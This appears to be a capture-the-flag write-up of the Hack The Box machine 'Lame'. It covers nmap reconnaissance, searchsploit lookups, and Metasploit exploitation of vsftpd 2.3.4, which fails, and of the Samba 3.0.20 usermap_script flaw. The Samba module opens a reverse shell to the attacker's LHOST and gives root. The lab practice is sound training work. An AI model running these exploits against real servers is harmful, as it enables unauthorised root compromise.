
# Connect to the machine 

use openvpn or another vpn to connect to the machine as follows 

```shell
openvpn lab_acountname.ovpn
```

after that try to ping the machine to make sure you are connected 


```shell
ping 10.10.3
```

if you get response then we are ready to enumerate


# Recon

 using Nmap with default scripts with default scripts and with services versions

```shell
sudo nmap -sV -sC 10.10.10.3
```


which results to 

```shell

Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-17 03:53 EDT
Nmap scan report for 10.10.10.3
Host is up (0.17s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-08-17T03:49:20-04:00
|_clock-skew: mean: 1h55m03s, deviation: 2h49m45s, median: -4m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.09 seconds
```


to summery this result we have 4 porst open :

1. 21/ftp
2. 22/ssh
3. 139/tcp (for SMB)
4. 445/tcp (for SMB)

OS : **Linux**

FTP version  :  **vsftpd 2.3.4**
SSH version :  **OpenSSH 4.7p1 Debian**
Samba version : **Samba 3.0.20-Debian**


and **Anonymous FTP login allowed** 


# Enumeration

From the Recon we can start Enumerating the FTP service as it has Anonymous Login:

## FTP enumeration
connect to the FTP server using (Enter any Password)

```shell
ftp ftp://anonymous@10.10.10.3:21
```

then list all directories 

```shell
ftp> ls

229 Entering Extended Passive Mode (|||19236|).
150 Here comes the directory listing.
226 Directory send OK.

```



lets check our directory
```shell
ftp> pwd

Remote directory: /

```

we are at the remote directory and nothing there so we have to find another way to enumerate the box.


## Service version Scan
lets see if any of the services versions is vulnerable

1. vsftpd 2.3.4 (Vulnerable)

```shell
searchsploit vsftpd 2.3.4


--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                          | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                             | unix/remote/17491.rb
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

2. Openssh 4.7p1 (Not Vulberable)

```shell
searchsploit openssh 4.7p1


--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                           | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                     | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                       | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                             | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalati | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                           | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                               | linux/remote/45939.py
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

3. Samba 3.0.20 (Vulnerable)
```shell
searchsploit samba 3.0.20     
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                             | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                   | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                              | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                      | linux_x86/dos/36741.py
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```


Both FTP and samba are vulnerable and have a metasploit module.

lets run Metasploit and try to enumerate both

## Metasploit

### Enumerating vsftpd 2.3.4
start metasploit with 

```shell
msfconsole
```


selecting the exploit

```shell
search vsftpd 2.3.4

use exploit/unix/ftp/vsftpd_234_backdoor

show options


```

we selected the exploit now we have to set the RHOSTS to the box IP and run the exploit

```shell
set RHOSTS 10.10.10.3

run

->
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
  
[*] Exploit completed, but no session was created.
```

it looks like the exploit didn't work fur us as metasploit stated that no session was created.

### Enumerating Samba 3.0.20



selecting the exploit

```shell
search samba 3.0.20

use exploit/multi/samba/usermap_script

show options


```

we selected the exploit now we have to set the RHOSTS to the box IP and and LHOST to our IP and run the exploit

```shell
set RHOSTS 10.10.10.3
set LHOST 10.10.14.4

run

->
[*] Command shell session 1 opened

```

we have a command shell 
lets see if we can get a shell 

```shell
shell

->
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash


root@lame:/# 

```

we have a root shell , lets now search for the flags 

```shell
find /root /home -name '*.txt'

->
/root/.purple/logs/irc/metasploitable2@irc.ubuntu.com/nickserv/2012-05-20.151028-0400EDT.txt
/root/root.txt
/root/.mozilla/firefox/k4m5fjw3.default/urlclassifierkey3.txt
/home/makis/user.txt

```

see the flags using 

```shell

cat /home/makis/user.txt

cat /root/root.txt
```

